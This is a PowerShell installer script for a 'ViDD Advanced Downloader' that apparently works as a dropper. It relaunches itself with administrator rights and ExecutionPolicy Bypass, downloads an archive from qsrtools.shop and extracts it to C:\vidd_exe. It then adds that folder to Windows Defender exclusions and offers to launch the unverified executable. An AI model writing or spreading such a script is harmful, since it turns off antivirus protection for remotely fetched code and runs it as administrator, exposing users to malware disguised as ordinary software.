# ========================================
# ViDD Advanced Downloader Installer Script
# Version 2.0 - Optimized
# ========================================

# Relaunch in interactive PowerShell if run via pipe
if ($Host.Name -ne 'ConsoleHost') {
    Start-Process powershell -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Check for admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
    Write-Host "Please run this script as Administrator." -ForegroundColor Red
    Read-Host -Prompt "Press Enter to exit"
    exit
}

# Configuration
$downloadURL = "https://www.qsrtools.shop/vidd_beta.zip"
$archiveFile = "$env:TEMP\vidd_beta.zip"
$extractFolder = "C:\vidd_exe"
$exeName = "ViDD.exe"
$shortcutName = "ViDD Downloader.lnk"

# Clean up old download if exists
if (Test-Path $archiveFile) {
    Remove-Item $archiveFile -Force
}

Write-Host "`n===================================" -ForegroundColor Cyan
Write-Host "  ViDD Advanced Downloader Setup" -ForegroundColor Cyan
Write-Host "===================================`n" -ForegroundColor Cyan

# Function to format file size
function Format-FileSize {
    param([long]$Size)
    if ($Size -gt 1MB) {
        return "{0:N2} MB" -f ($Size / 1MB)
    } elseif ($Size -gt 1KB) {
        return "{0:N2} KB" -f ($Size / 1KB)
    } else {
        return "$Size bytes"
    }
}

# Function to download with progress
function Download-FileWithProgress {
    param(
        [string]$Url,
        [string]$Destination,
        [int]$MaxRetries = 3
    )
    
    $retryCount = 0
    $downloaded = $false
    
    while (-not $downloaded -and $retryCount -lt $MaxRetries) {
        try {
            Write-Host "Download attempt $($retryCount + 1) of $MaxRetries..." -ForegroundColor Yellow
            
            # Try BITS first (fastest and most reliable)
            if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
                Write-Host "Using BITS for fast download..." -ForegroundColor Green
                
                $bitsJob = Start-BitsTransfer -Source $Url -Destination $Destination -Asynchronous -DisplayName "ViDD Download"
                
                while (($bitsJob.JobState -eq "Transferring") -or ($bitsJob.JobState -eq "Connecting")) {
                    if ($bitsJob.BytesTransferred -gt 0) {
                        $percentComplete = ($bitsJob.BytesTransferred / $bitsJob.BytesTotal) * 100
                        Write-Progress -Activity "Downloading ViDD" `
                            -Status ("Downloaded {0} of {1}" -f (Format-FileSize $bitsJob.BytesTransferred), (Format-FileSize $bitsJob.BytesTotal)) `
                            -PercentComplete $percentComplete
                    }
                    Start-Sleep -Milliseconds 500
                }
                
                Write-Progress -Activity "Downloading ViDD" -Completed
                
                if ($bitsJob.JobState -eq "Transferred") {
                    Complete-BitsTransfer -BitsJob $bitsJob
                    $downloaded = $true
                    Write-Host "Download completed successfully!" -ForegroundColor Green
                } else {
                    throw "BITS transfer failed with state: $($bitsJob.JobState)"
                }
            }
            # Fallback to WebClient
            else {
                Write-Host "Using WebClient for download..." -ForegroundColor Yellow
                
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "ViDD-Installer/2.0")
                
                # Register event for progress
                $progressActivity = "Downloading ViDD"
                Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
                    $percent = $eventArgs.ProgressPercentage
                    $totalBytes = $eventArgs.TotalBytesToReceive
                    $receivedBytes = $eventArgs.BytesReceived
                    
                    Write-Progress -Activity $progressActivity `
                        -Status ("Downloaded {0} of {1}" -f (Format-FileSize $receivedBytes), (Format-FileSize $totalBytes)) `
                        -PercentComplete $percent
                } | Out-Null
                
                # Download file
                $webClient.DownloadFile($Url, $Destination)
                $webClient.Dispose()
                
                Write-Progress -Activity $progressActivity -Completed
                $downloaded = $true
                Write-Host "Download completed successfully!" -ForegroundColor Green
            }
        }
        catch {
            $retryCount++
            Write-Host "Download failed: $_" -ForegroundColor Red
            
            if ($retryCount -lt $MaxRetries) {
                $waitTime = 5 * $retryCount
                Write-Host "Retrying in $waitTime seconds..." -ForegroundColor Yellow
                Start-Sleep -Seconds $waitTime
            } else {
                Write-Host "Maximum retries reached. Download failed." -ForegroundColor Red
                throw $_
            }
        }
    }
    
    return $downloaded
}

# Start download
try {
    Write-Host "Starting download from: $downloadURL" -ForegroundColor Cyan
    $success = Download-FileWithProgress -Url $downloadURL -Destination $archiveFile -MaxRetries 3
    
    if (-not $success) {
        throw "Download failed after all retries"
    }
    
    # Verify download
    if (Test-Path $archiveFile) {
        $fileSize = (Get-Item $archiveFile).Length
        Write-Host "Downloaded file size: $(Format-FileSize $fileSize)" -ForegroundColor Green
        
        if ($fileSize -eq 0) {
            throw "Downloaded file is empty"
        }
    } else {
        throw "Downloaded file not found"
    }
}
catch {
    Write-Host "`nError during download: $_" -ForegroundColor Red
    Write-Host "Please check your internet connection and try again." -ForegroundColor Yellow
    Read-Host -Prompt "Press Enter to exit"
    exit
}

# Create extraction folder if it doesn't exist
Write-Host "`nPreparing installation folder..." -ForegroundColor Cyan
if (!(Test-Path $extractFolder)) {
    New-Item -ItemType Directory -Path $extractFolder | Out-Null
    Write-Host "Created folder: $extractFolder" -ForegroundColor Green
} else {
    Write-Host "Installation folder already exists" -ForegroundColor Yellow
}

# Check file type and extract
Write-Host "`nExtracting files..." -ForegroundColor Cyan
$headerBytes = Get-Content -Path $archiveFile -Encoding Byte -TotalCount 4
$header = ($headerBytes | ForEach-Object { $_.ToString("X2") }) -join ""
Write-Host "File signature: $header" -ForegroundColor Gray

try {
    if ($header -eq "52617221") {
        Write-Host "Detected RAR archive" -ForegroundColor Yellow
        
        # Check for WinRAR
        $winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
        if (!(Test-Path $winrar)) { 
            $winrar = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" 
        }
        
        if (Test-Path $winrar) {
            Write-Host "Extracting with WinRAR..." -ForegroundColor Cyan
            & $winrar x -o+ -y $archiveFile "$extractFolder\"
            if ($LASTEXITCODE -ne 0) {
                throw "WinRAR extraction failed"
            }
        } else {
            throw "WinRAR is required to extract RAR files. Please install WinRAR first."
        }
    }
    elseif ($header -eq "504B0304") {
        Write-Host "Detected ZIP archive" -ForegroundColor Yellow
        Write-Host "Extracting ZIP file..." -ForegroundColor Cyan
        
        # Use faster extraction method
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($archiveFile, $extractFolder)
        
        Write-Host "Extraction completed!" -ForegroundColor Green
    }
    else {
        throw "Unknown file type. Cannot extract."
    }
}
catch {
    Write-Host "Extraction failed: $_" -ForegroundColor Red
    
    # Try alternative extraction as fallback
    try {
        Write-Host "Attempting alternative extraction method..." -ForegroundColor Yellow
        Expand-Archive -Path $archiveFile -DestinationPath $extractFolder -Force
        Write-Host "Alternative extraction successful!" -ForegroundColor Green
    }
    catch {
        Write-Host "All extraction methods failed" -ForegroundColor Red
        Read-Host -Prompt "Press Enter to exit"
        exit
    }
}

# Verify extraction
$exePath = Join-Path $extractFolder $exeName
if (!(Test-Path $exePath)) {
    Write-Host "Warning: $exeName not found in extracted files!" -ForegroundColor Red
    Write-Host "Please check if extraction was successful." -ForegroundColor Yellow
}

# Add to Windows Defender exclusion
Write-Host "`nConfiguring Windows Defender exclusion..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath $extractFolder -ErrorAction Stop
    Write-Host "Added folder to Defender exclusions" -ForegroundColor Green
}
catch {
    Write-Host "Could not add Defender exclusion: $_" -ForegroundColor Yellow
    Write-Host "You may need to add it manually if you experience issues" -ForegroundColor Yellow
}

# Create desktop shortcut
Write-Host "`nCreating desktop shortcut..." -ForegroundColor Cyan
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $shortcutPath = Join-Path $desktopPath $shortcutName
    
    # Remove old shortcut if exists
    if (Test-Path $shortcutPath) {
        Remove-Item $shortcutPath -Force
    }
    
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $exePath
    $shortcut.WorkingDirectory = $extractFolder
    $shortcut.IconLocation = "$exePath,0"
    $shortcut.WindowStyle = 1
    $shortcut.Description = "ViDD Advanced Downloader"
    $shortcut.Save()
    
    Write-Host "Desktop shortcut created successfully!" -ForegroundColor Green
}
catch {
    Write-Host "Could not create desktop shortcut: $_" -ForegroundColor Yellow
}

# Clean up temp file
Write-Host "`nCleaning up temporary files..." -ForegroundColor Cyan
try {
    Remove-Item $archiveFile -Force -ErrorAction SilentlyContinue
    Write-Host "Temporary files removed" -ForegroundColor Green
}
catch {
    Write-Host "Could not remove temp file (non-critical)" -ForegroundColor Yellow
}

# Installation complete
Write-Host "`n===================================" -ForegroundColor Green
Write-Host "  Installation Complete!" -ForegroundColor Green
Write-Host "===================================" -ForegroundColor Green
Write-Host "`nViDD has been installed to: $extractFolder" -ForegroundColor Cyan
Write-Host "Desktop shortcut: $shortcutName" -ForegroundColor Cyan

# Offer to launch
$launch = Read-Host "`nWould you like to launch ViDD now? (Y/N)"
if ($launch -eq 'Y' -or $launch -eq 'y') {
    if (Test-Path $exePath) {
        Write-Host "Launching ViDD..." -ForegroundColor Cyan
        Start-Process $exePath
    } else {
        Write-Host "Could not find $exeName" -ForegroundColor Red
    }
}

Write-Host "`nPress Enter to exit..." -ForegroundColor Gray
Read-Host
